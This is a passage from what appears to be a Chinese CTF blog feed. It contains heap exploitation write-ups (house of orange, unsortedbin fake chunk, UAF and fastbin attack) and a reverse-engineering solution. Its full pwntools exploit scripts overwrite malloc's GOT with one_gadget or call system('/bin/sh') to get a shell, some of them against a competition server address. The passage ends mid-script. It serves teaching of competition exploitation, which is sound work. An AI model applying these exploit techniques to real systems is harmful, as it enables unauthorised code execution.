<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
</ol></li>
<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
</ol></li>
<li>Any Address Write
<ol type="1">
<li>思路1：常规unsortedbin attack
<ol type="1">
<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
</ol></li>
<li>思路2：unsortedbin 申请 fake_chunk
<ol type="1">
<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
</ol></li>
</ol></li>
</ol></li>
<li>将写入的got表改写为og即可提权</li>
</ol>
<h1 id="x02-具体步骤">0x02 具体步骤</h1>
<ol type="1">
<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br></pre></td></tr></table></figure></li>
<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br></pre></td></tr></table></figure></li>
<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x03-一些问题">0x03 一些问题</h1>
<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
Q2：
我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./baby_heap&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023HwsSDU专场CTF-wp</title>
    <url>/posts/56099.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWS！PWN+RE+CRYPTO
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h2 id="re-1">Re</h2>
<blockquote>
<p>这个题本来打好逆向后的包准备写 wp
的，结果重新加载的时候给覆盖了...就不配图了，函数顺序按照反汇编从上到下来分析的。</p>
</blockquote>
<p>拿到这个题看到有反调试，没 patch ，直接静态分析了</p>
<h4 id="st-important-function">- 1st important function</h4>
<p>第一个重要函数里有一个 flag{} 的判断，还有一个对于'-'的判断，可以猜测
flag 的格式为 flag{uuid}</p>
<p>接下来的一个函数有花指令，把 E8 改成 90
以后重新反汇编，还是没有啥东西...为了不影响后面做题，还是回到一开始的地方把
jz 改成了 jnz
，然后动调发现这个带花的函数基本没啥用，好像就调用了个<code>__chkesp</code>函数，但我不太清楚这是干啥的，就直接忽略了</p>
<h4 id="nd-important-function">- 2nd important function</h4>
<p>第二个重要函数对我们输入的 flag
做了一些操作，把中间的'-'全部删掉，并做了一些移动的操作，大概就是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="rd-important-function">- 3rd important function</h4>
<p>第三个函数将 uuid 的前 32
个字节作为参数，做了一些异或操作和比对操作，我们可以恢复一部分 flag
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> encdata1[<span class="number">13</span>];</span><br><span class="line"><span class="type">char</span> encdata2[<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> encdata3[<span class="number">22</span>];</span><br><span class="line"><span class="type">char</span> flag[<span class="number">42</span>]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    encdata1[<span class="number">0</span>] = <span class="number">102</span>;</span><br><span class="line">    encdata1[<span class="number">1</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">2</span>] = <span class="number">51</span>;</span><br><span class="line">    encdata1[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">    encdata1[<span class="number">4</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    encdata1[<span class="number">6</span>] = <span class="number">96</span>;</span><br><span class="line">    encdata1[<span class="number">7</span>] = <span class="number">60</span>;</span><br><span class="line">    encdata1[<span class="number">8</span>] = <span class="number">61</span>;</span><br><span class="line">    encdata1[<span class="number">9</span>] = <span class="number">34</span>;</span><br><span class="line">    encdata1[<span class="number">10</span>] = <span class="number">104</span>;</span><br><span class="line">    encdata1[<span class="number">11</span>] = <span class="number">33</span>;</span><br><span class="line">    encdata1[<span class="number">12</span>] = <span class="number">56</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (<span class="number">2</span>*i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，这个函数只对前13个字节做了操作，剩下的19个字节没用到</p>
<h4 id="th-important-function">- 4th important function</h4>
<p>第四个函数将 uuid
的中间18位放了进去，然后做了一大堆操作以后跟下面的东西做了比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v5[<span class="number">0</span>] = <span class="number">63</span>;</span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">-70</span>;</span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">-111</span>;</span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">116</span>;</span><br><span class="line">v5[<span class="number">6</span>] = <span class="number">2</span>;</span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">38</span>;</span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">-20</span>;</span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">-110</span>;</span><br><span class="line">v5[<span class="number">10</span>] = <span class="number">56</span>;</span><br><span class="line">v5[<span class="number">11</span>] = <span class="number">-62</span>;</span><br><span class="line">v5[<span class="number">12</span>] = <span class="number">11</span>;</span><br><span class="line">v5[<span class="number">13</span>] = <span class="number">109</span>;</span><br><span class="line">v5[<span class="number">14</span>] = <span class="number">39</span>;</span><br><span class="line">v5[<span class="number">15</span>] = <span class="number">-45</span>;</span><br></pre></td></tr></table></figure>
<p>由于看到了这个函数里面有个子函数有超长的一串，虽然看不懂，但我怀疑这应该是某个加密算法的手搓版，于是就问
GPT 老师，它跟我说是MD5加密算法的一部分(后来用 findcrypt
插件也能看出来)。</p>
<p>而后面还有个函数是这18位中前14位的 base64_encode
，也就是说我们解码后只需要爆破后4位即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([<span class="number">63</span>, -<span class="number">70</span>, -<span class="number">60</span>, -<span class="number">111</span>, -<span class="number">60</span>, <span class="number">116</span>, <span class="number">2</span>, <span class="number">38</span>, -<span class="number">20</span>, -<span class="number">110</span>, <span class="number">56</span>, -<span class="number">62</span>, <span class="number">11</span>, <span class="number">109</span>, <span class="number">39</span>, -<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 将i和j转换为两位16进制数</span></span><br><span class="line">                hex_i = <span class="built_in">format</span>(i, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_j = <span class="built_in">format</span>(j, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_k = <span class="built_in">format</span>(k, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_m = <span class="built_in">format</span>(m, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构建待加密的明文</span></span><br><span class="line">                plaintext = <span class="string">f&#x27;f47813c26594c0<span class="subst">&#123;hex_i&#125;</span><span class="subst">&#123;hex_j&#125;</span><span class="subst">&#123;hex_k&#125;</span><span class="subst">&#123;hex_m&#125;</span>&#x27;</span></span><br><span class="line">                <span class="comment"># print(plaintext)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算MD5散列值</span></span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                <span class="comment"># print(hashed_text.hex())</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> hashed_text.<span class="built_in">hex</span>() == <span class="string">&#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // 这里的最后一位 a 不是真的 a ，是因为一开始我写的 flag 格式是a，这一位还是需要我们爆破的</span></span><br></pre></td></tr></table></figure>
<p>拿到平台上去爆破最后一位，没想到直接就是 0 ，一遍过~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="pwn">PWN</h1>
<h2 id="inverse">inverse</h2>
<p>32位 + 整数溢出 + 简单栈溢出，思路真没啥好写的，直接上exp吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30011&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">work_addr = <span class="number">0x80493D5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; msg:&#x27;</span>)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh  =  libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bin_sh = <span class="number">0x0804C030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller">controller</h2>
<p>这题是 awdp/awd 的题吧，好多洞...但是为什么 patchelf
以后会给我报<code>libgcc_s.so.0</code>的错啊，我还从
lib64/lib/2.27libgcc库 中拷贝了对应文件，结果都不行...</p>
<p>灰盒的 heap 题太难打了...不过从22:00打到3:00出 flag
的一瞬间真的巨爽</p>
<p>这题逆向就挺费时间的，一堆没啥用的函数，就只有<code>choice == 1/2/3/6(堆题的uaf) || choice == 1/9(fmt + 栈)</code></p>
<p>...写 wp 的时候去看了一下 choice == 9，结果突然发现 strlen 用''
就可以随便绕...早知道不灰盒打堆了...</p>
<p>我的思路是 uaf + fastbin attack</p>
<ul>
<li>alloc 再 free 两个 chunk<br />
</li>
<li>由于 fastbin LIFO，利用 uaf 将 heap_list (堆指针表)的地址写入
chunk13 的 fd 和 bk</li>
<li>申请两个同样大小的 chunk ，我们就能用 chunk15 任意地址读写了</li>
<li>leak
<ul>
<li>首先把 malloc 的 got 写进 chunk15，然后 show，就可以leak libc
基址</li>
</ul></li>
<li>write
<ul>
<li>由于这个时候，heap_list 中还存有 malloc_got
，于是我们直接控制这个指针去写 malloc_got 指向的地址</li>
</ul></li>
<li>将 one_gadget 写入 malloc_got 指向的地址，当我们再去 malloc
的时候，就会调用 og 进而提权。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30070&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;length of the new pipe name? &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;name of the new pipe? &#x27;</span>, content1)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please write a description: &#x27;</span>, content2)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;(radius,speed,length): &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Choose &gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Plese input info &gt;&#x27;</span>,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(index):</span></span><br><span class="line"><span class="comment">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">content1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">content2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 12</span></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">content = p64(<span class="number">0x60418f</span>)</span><br><span class="line">edit(<span class="number">13</span>,content)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">content1 = <span class="string">b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27;</span> + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 15</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line">malloc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">get_shell = libc_base + 